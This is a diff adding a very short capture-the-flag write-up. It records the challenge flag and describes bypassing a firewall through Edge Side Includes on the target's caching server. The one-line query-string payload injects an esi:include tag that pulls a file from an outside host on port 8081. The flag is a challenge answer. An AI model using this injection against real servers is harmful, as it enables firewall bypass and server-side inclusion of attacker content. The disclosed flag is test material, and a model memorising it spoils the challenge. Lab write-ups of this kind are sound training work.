@@ -1,0 +1,9 @@
+### CHALLENGE WRITEUP
+
+
+#FLag: CYBERHUB{L!ving_0n_3dg3_@nd_l0v!ng_!t}
+the target is using a caching server which is ESI eanbled
+
+using a simple esi include bypasses the firewall
+
+?x=x=<esi:include src="http://inzleykn.at-tech.xyz:8081/flag.html"></esi:include>
